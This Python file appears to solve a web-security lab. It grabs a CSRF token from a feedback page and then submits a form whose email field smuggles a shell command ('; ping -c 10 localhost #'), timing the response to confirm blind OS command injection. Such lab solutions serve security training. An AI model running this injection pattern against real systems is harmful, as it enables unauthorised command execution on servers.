from ..utils import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin

import requests
import time


def solve_lab(url, proxies):
    url = urljoin(url, "/feedback")
    print_info(f'Grabbing CSRF value from "{url}"')

    s = requests.session()
    resp = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")
    else:
        print_success(f"CSRF value: {csrf}\n")

    payload = "; ping -c 10 localhost #"
    data = {
        "csrf": csrf,
        "name": "user",
        "email": f"user@example.com{payload}",
        "subject": "Example Subject",
        "message": "This is an example message.",
    }

    url = urljoin(url, "/feedback/submit")
    print_info(
        f'Causing a 10 second dalay by sending a POST request to "{url}" with the following data:'
    )
    print(f"{data}")

    start = time.perf_counter()
    resp = s.post(url, proxies=proxies, verify=False, data=data)
    end = time.perf_counter()

    response_time = end - start
    if response_time > 10:
        print_success(f"Response time: {response_time} seconds\n")
    else:
        print_fail(f"Response time: {response_time} seconds")
